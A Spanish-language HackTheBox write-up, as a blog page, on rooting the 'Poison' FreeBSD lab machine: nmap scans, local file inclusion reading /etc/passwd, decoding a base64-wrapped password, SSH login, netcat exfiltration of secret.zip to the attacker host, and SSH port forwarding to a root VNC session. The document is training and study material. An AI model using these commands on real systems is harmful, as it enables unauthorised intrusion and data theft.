<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Poison Writeup [ES] - HackTheBox" /><meta property="og:locale" content="en" /><meta name="description" content="Poison es una máquina FreeBSD de dificultad media ofrecida por la plataforma de Hack The Box. A lo largo de este post encontrarás un writeup indicando la forma de como rootearla." /><meta property="og:description" content="Poison es una máquina FreeBSD de dificultad media ofrecida por la plataforma de Hack The Box. A lo largo de este post encontrarás un writeup indicando la forma de como rootearla." /><link rel="canonical" href="https://brsalcedom.github.io/Poison-Writeup-HackTheBox/" /><meta property="og:url" content="https://brsalcedom.github.io/Poison-Writeup-HackTheBox/" /><meta property="og:site_name" content="brsalcedom" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-11-09T17:00:00-03:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Poison Writeup [ES] - HackTheBox" /><meta name="twitter:site" content="@Cervant_0" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2021-11-09T17:00:00-03:00","datePublished":"2021-11-09T17:00:00-03:00","description":"Poison es una máquina FreeBSD de dificultad media ofrecida por la plataforma de Hack The Box. A lo largo de este post encontrarás un writeup indicando la forma de como rootearla.","headline":"Poison Writeup [ES] - HackTheBox","mainEntityOfPage":{"@type":"WebPage","@id":"https://brsalcedom.github.io/Poison-Writeup-HackTheBox/"},"url":"https://brsalcedom.github.io/Poison-Writeup-HackTheBox/"}</script><title>Poison Writeup [ES] - HackTheBox | brsalcedom</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="brsalcedom"><meta name="application-name" content="brsalcedom"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /images/avatar.png " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">brsalcedom</a></div><div class="site-subtitle font-italic">Personal Cybersecurity & Pentesting blog</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/brsalcedom" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/Cervant_0" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['brsalcedom','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Poison Writeup [ES] - HackTheBox</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Poison Writeup [ES] - HackTheBox</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/Cervant_0">Bryan Salcedo</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1636488000" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2021-11-09 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1036 words"> <em>5 min</em> read</span></div></div></div><div class="post-content"><p><a href="https://app.hackthebox.com/machines/132">Poison</a> es una máquina <strong>FreeBSD</strong> de dificultad media ofrecida por la plataforma de <a href="https://app.hackthebox.com/">Hack The Box</a>. A lo largo de este post encontrarás un writeup indicando la forma de como rootearla.</p><h2 id="información"><span class="mr-2">Información</span><a href="#información" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p><img data-src="/images/HTB/Poison/01-info.png" alt="Info" data-proofer-ignore></p><h2 id="enumeración"><span class="mr-2">Enumeración</span><a href="#enumeración" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="nmap"><span class="mr-2">NMAP</span><a href="#nmap" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>Como siempre, se iniciará realizando un escaneo general de los 65535 puertos.</p><ul><li><code class="language-plaintext highlighter-rouge">nmap -sS --min-rate 5000 -p- -n -v 10.10.10.9 -oG allPorts.gnmap</code></ul><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-10 00:23 -03
Stats: 0:02:09 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
Nmap scan report for 10.10.10.84
Host is up (0.14s latency).
Not shown: 36848 filtered ports, 28685 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 149.69 seconds
</pre></table></code></div></div><p>Posteriormente se realiza un escaner más exhaustivo para conocer servicios y versiones asociados a los puertos abiertos encontrados.</p><ul><li><code class="language-plaintext highlighter-rouge">nmap -sC -sV -p22,80 -n -oN ports.nmap 10.10.10.84</code></ul><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre>Nmap scan report for 10.10.10.84
Host is up (0.14s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)
| ssh-hostkey:
|   2048 e3:3b:7d:3c:8f:4b:8c:f9:cd:7f:d2:3a:ce:2d:ff:bb (RSA)
|   256 4c:e8:c6:02:bd:fc:83:ff:c9:80:01:54:7d:22:81:72 (ECDSA)
|_  256 0b:8f:d5:71:85:90:13:85:61:8b:eb:34:13:5f:94:3b (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32)
|_http-server-header: Apache/2.4.29 (FreeBSD) PHP/5.6.32
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Nov  9 18:53:50 2021 -- 1 IP address (1 host up) scanned in 12.33 seconds
</pre></table></code></div></div><ul><li>Resumen puertos</ul><div class="table-wrapper"><table><thead><tr><th>Puerto<th>Estado<th>Servicio<tbody><tr><td>22/tcp<td>Abierto<td>OpenSSH 7.2 - FreeBSD<tr><td>80/tcp<td>Abierto<td>Apache httpd 2.4.29</table></div><h2 id="ganando-acceso"><span class="mr-2">Ganando acceso</span><a href="#ganando-acceso" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="método-1"><span class="mr-2">Método 1</span><a href="#método-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>El ganar acceso a esta máquina es bastante trivial, ya que al entrar al sitio web expuesto, se verá lo siguiente.</p><p><img data-src="/images/HTB/Poison/10-website.png" alt="" data-proofer-ignore></p><p>Se visualiza un sitio web bastante simple que permite leer archivos locales de la máquina. Esto hace pensar inmediatamente que puede existir LFI.</p><p>Al hacer una consulta al archivo <code class="language-plaintext highlighter-rouge">ini.php</code> como se sugiere, en la URL se lista la petición hecha a través de la variable <code class="language-plaintext highlighter-rouge">file</code>.</p><p><img data-src="/images/HTB/Poison/15-lfi.png" alt="" data-proofer-ignore></p><p>Yendo un poco más allá, se puede intentar pasarle a <code class="language-plaintext highlighter-rouge">file</code> un archivo de sistema para validar si es posible leerlo. En este caso lo más común sería intentar listar <code class="language-plaintext highlighter-rouge">/etc/passwd</code>.</p><p><img data-src="/images/HTB/Poison/20-etc-passwd.png" alt="" data-proofer-ignore></p><p>Efectivamente se puede leer, sin necesidad de aplicar <strong>Path Traversal</strong> y se obtiene un usuario del sistema.</p><p>Antes de seguir listando otros archivos del sistema, se procederá a revisar los archivos que recomendaba la web inicial, uno de ellos es <code class="language-plaintext highlighter-rouge">listfiles.php</code>.</p><p><img data-src="/images/HTB/Poison/25-pwdbackup.png" alt="" data-proofer-ignore></p><p>este archivo, como dice su propio nombre, listará todos los archivos del directorio actual y acá es donde se ve un recurso de interés: <code class="language-plaintext highlighter-rouge">pwdbackup.txt</code>. Al leerlo se verá que contiene una contraseña cifrada posiblemente en <strong>base64</strong> y al menos 13 veces como indica el texto.</p><p><img data-src="/images/HTB/Poison/30-pwd-encoded.png" alt="" data-proofer-ignore></p><p>Por el momento se guardará esta cadena en el archivo <code class="language-plaintext highlighter-rouge">encoded-pass.txt</code>.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="nb">cat </span>encoded-pass.txt

<span class="nv">Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVUbGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBSbVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVWM040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRsWmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYyeG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01GWkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYwMXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVaT1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5kWFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZkWGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZTVm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZzWkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBWVmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpOUkd4RVdub3dPVU5uUFQwSwo</span><span class="o">=</span>
</pre></table></code></div></div><p>Para esto lo más cómodo será crear un script simple que realice la decodificación de esta cadena.</p><ul><li><code class="language-plaintext highlighter-rouge">decode</code> bash script.</ul><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre><span class="c">#!/bin/bash</span>

<span class="k">if</span> <span class="o">[</span> <span class="nt">-z</span> <span class="s2">"</span><span class="nv">$1</span><span class="s2">"</span> <span class="o">]</span><span class="p">;</span> <span class="k">then
  </span><span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">[!] Please provide file to read."</span>
  <span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">Usage: ./</span><span class="si">$(</span><span class="nb">basename</span> <span class="nv">$0</span><span class="si">)</span><span class="s2"> mybase64encodedfile.txt"</span>
  <span class="nb">exit </span>0
<span class="k">fi

</span><span class="nv">password</span><span class="o">=</span><span class="si">$(</span><span class="nb">cat</span> <span class="nv">$1</span><span class="si">)</span>

<span class="k">for </span>i <span class="k">in</span> <span class="o">{</span>1..13<span class="o">}</span>
<span class="k">do
  </span><span class="nv">password</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="s2">"</span><span class="nv">$password</span><span class="s2">"</span> | <span class="nb">base64</span> <span class="nt">-d</span><span class="si">)</span>
<span class="k">done

</span><span class="nb">echo</span> <span class="s2">"</span><span class="nv">$password</span><span class="s2">"</span>
</pre></table></code></div></div><p><img data-src="/images/HTB/Poison/35-pwd-decoded.png" alt="" data-proofer-ignore></p><p>Con esto se obtiene la contraseña: <code class="language-plaintext highlighter-rouge">Charix!2#4%6&amp;8(0</code>, y recordando lo revisado anteriormente, se tiene un usuario del sistema con el que probar si es posible entrar por <strong>SSH</strong>.</p><p><img data-src="/images/HTB/Poison/40-ssh-login.png" alt="" data-proofer-ignore></p><h3 id="método-2---log-poisoning"><span class="mr-2">Método 2 - Log Poisoning</span><a href="#método-2---log-poisoning" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><h2 id="escalando-privilegios"><span class="mr-2">Escalando privilegios</span><a href="#escalando-privilegios" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Ahora toca la fase de reconocimiento dentro de la máquina para buscar vías potenciales para la escalada de privilegios. Revisando el directorio home del user ya se visualiza la flag un archivo interesante: <code class="language-plaintext highlighter-rouge">secret.zip</code>.</p><p><img data-src="/images/HTB/Poison/42-files.png" alt="" data-proofer-ignore></p><p><img data-src="/images/HTB/Poison/43-cannot-unzip.png" alt="" data-proofer-ignore></p><p>Al intentar descomprimir, aparece un mensaje indicando que es necesario proporcionar una contraseña pero no permite ingresarla. Debido a esto lo que se puede hacer es mover este <strong>.zip</strong> a la máquina atacante para intentar descomprimirlo.</p><p>En este caso hay varias opciones, pero en esta ocasión se usará <strong>netcat</strong> para la transferencia de archivos.</p><ul><li>Máquina víctima: <code class="language-plaintext highlighter-rouge">nc -v 10.10.14.12 443 &lt; secret.zip</code>.<li>Máquina atacante: <code class="language-plaintext highlighter-rouge">nc -nvlp 443 &gt; secret.zip</code>.</ul><p><img data-src="/images/HTB/Poison/45-nc-transfer.png" alt="" data-proofer-ignore></p><p>Ya en posesión del <code class="language-plaintext highlighter-rouge">.zip</code> lo primero a intentar será la contraseña del user <strong>charix</strong>.</p><p><img data-src="/images/HTB/Poison/50-unzip-secret.png" alt="" data-proofer-ignore></p><p>Efectivamente la clave es válida pero la descompresión entrega un archivo con contenido ilegible y la herramienta <code class="language-plaintext highlighter-rouge">file</code> no proporciona mayor información.</p><p>Continuando con la enumeración, al listar procesos se visualiza algo interesante.</p><ul><li>Listar procesos: <code class="language-plaintext highlighter-rouge">ps -faux</code>.</ul><p><img data-src="/images/HTB/Poison/60-ps-faux.png" alt="" data-proofer-ignore></p><p>Al parecer hay un servicio de <strong>VNC</strong> corriendo con el usuario <strong>root</strong>. Esta es una vía potencial para escalar privilegios si se pudiera entrar a la sesión de VNC activa, el problema es que el puerto <strong>5901/tcp</strong> para la conexión a <strong>VNC</strong> está cerrado desde la máquina víctima.</p><p>Para solventar lo anterior, se puede utilizar <strong>SSH</strong> para realizar un port forwarding.</p><h3 id="port-fordwarding"><span class="mr-2">Port fordwarding</span><a href="#port-fordwarding" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>En este caso, se realizará un forwarding del puerto 5901(VNC) de la máquina Poison, hacia el puerto 8000 de la máquina local. De manera que cuando se consulte el puerto 8000 localmente, este tráfico llegará a Poison con el puerto 5901</p><ul><li><code class="language-plaintext highlighter-rouge">sshpass -p 'Charix!2#4%6&amp;8(0' ssh charix@10.10.10.84 -L 8000:127.0.0.1:5901</code></ul><p>Este comando iniciará una sesión SSH para la replicación de los puertos mencionados anteriormente, y mientras dure este proceso, se mantendrá la conexión. En el caso de que se requiera hacer lo mismo sin conectarse por consola, se puede emitir en segundo plano.</p><ul><li><code class="language-plaintext highlighter-rouge">sshpass -p 'Charix!2#4%6&amp;8(0' ssh charix@10.10.10.84 -L 8000:127.0.0.1:5901 -Nf</code></ul><p><img data-src="/images/HTB/Poison/65-port-fordwarding.png" alt="" data-proofer-ignore></p><h3 id="conexión-vnc"><span class="mr-2">Conexión VNC</span><a href="#conexión-vnc" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>Ya teniendo el port fordwarding establecido, se puede testear la conexión al puerto con un cliente VNC.</p><p><img data-src="/images/HTB/Poison/70-vnc-cx.png" alt="" data-proofer-ignore></p><p>Se ingresa la password conseguida anteriormente sin tener éxito: <code class="language-plaintext highlighter-rouge">Charix!2#4%6&amp;8(0</code>.</p><p><img data-src="/images/HTB/Poison/75-vnc-cx2.png" alt="" data-proofer-ignore></p><p>Al buscar otras alternativas y revisar la ayuda de <code class="language-plaintext highlighter-rouge">vncviewer</code> se identifica una opción interesante que permite conectar a través de un archivo de autenticación.</p><p><img data-src="/images/HTB/Poison/80-vnc-passwd.png" alt="" data-proofer-ignore></p><p>Volviendo atrás, se había conseguido un archivo que parecía estar cifrado, por lo que se podría usar este archivo <code class="language-plaintext highlighter-rouge">secret</code> para intentar una autenticación contra VNC.</p><p><img data-src="/images/HTB/Poison/90-vnc-connected.png" alt="" data-proofer-ignore></p><p>Y efectivamente el archivo permitió la conexión remota hacia la sesión VNC y paralelamente se abre la ventana, mostrando una consola bajo el conexto de <strong>root</strong>.</p><p><img data-src="/images/HTB/Poison/95-vnc-desktop.png" alt="" data-proofer-ignore></p><p>Con esto ya estaría rooteada la máquina Poison y solo restaría buscar y leer las flags.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/htb/'>HTB</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/medium/" class="post-tag no-text-decoration" >medium</a> <a href="/tags/log-poisoning/" class="post-tag no-text-decoration" >log-poisoning</a> <a href="/tags/vnc/" class="post-tag no-text-decoration" >vnc</a> <a href="/tags/port-forwarding/" class="post-tag no-text-decoration" >port-forwarding</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Poison Writeup [ES] - HackTheBox - brsalcedom&amp;url=https://brsalcedom.github.io/Poison-Writeup-HackTheBox/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Poison Writeup [ES] - HackTheBox - brsalcedom&amp;u=https://brsalcedom.github.io/Poison-Writeup-HackTheBox/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://brsalcedom.github.io/Poison-Writeup-HackTheBox/&amp;text=Poison Writeup [ES] - HackTheBox - brsalcedom" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/easy/">easy</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/medium/">medium</a> <a class="post-tag" href="/tags/active-directory/">active-directory</a> <a class="post-tag" href="/tags/privesc/">privesc</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/jenkins/">jenkins</a> <a class="post-tag" href="/tags/kerberoasting/">kerberoasting</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/Mango-Writeup-HackTheBox/"><div class="card-body"> <em class="timeago small" data-ts="1639584000" > 2021-12-15 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Mango Writeup [ES] - HackTheBox</h3><div class="text-muted small"><p> Mango es una máquina Linux de dificultad media ofrecida por la plataforma de Hack The Box. A lo largo de este post encontrarás un writeup de su resolución. Información Esta box introduce concepto...</p></div></div></a></div><div class="card"> <a href="/Forge-Writeup-HackTheBox/"><div class="card-body"> <em class="timeago small" data-ts="1642878000" > 2022-01-22 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Forge Writeup [ES] - HackTheBox</h3><div class="text-muted small"><p> Forge es una máquina Linux de dificultad media ofrecida por la plataforma de Hack The Box. Esta es una de las primeras máquinas que tuve el agrado de resolver cuando aún estaba Activa en la platafo...</p></div></div></a></div><div class="card"> <a href="/Jeeves-Writeup-HackTheBox/"><div class="card-body"> <em class="timeago small" data-ts="1635796800" > 2021-11-01 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Jeeves Writeup [ES] - HackTheBox</h3><div class="text-muted small"><p> Jeeves es una máquina Windows de dificultad media ofrecida por la plataforma de Hack The Box. A lo largo de este post encontrarás un writeup mostrando la forma de como rootearla. Información En...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/Bastard-Writeup-HackTheBox/" class="btn btn-outline-primary" prompt="Older"><p>Bastard Writeup [ES] - HackTheBox</p></a> <a href="/BountyHunter-Writeup-HackTheBox/" class="btn btn-outline-primary" prompt="Newer"><p>BountyHunter Writeup [ES] - HackTheBox</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/Cervant_0">Bryan Salcedo</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/easy/">easy</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/medium/">medium</a> <a class="post-tag" href="/tags/active-directory/">active-directory</a> <a class="post-tag" href="/tags/privesc/">privesc</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/jenkins/">jenkins</a> <a class="post-tag" href="/tags/kerberoasting/">kerberoasting</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
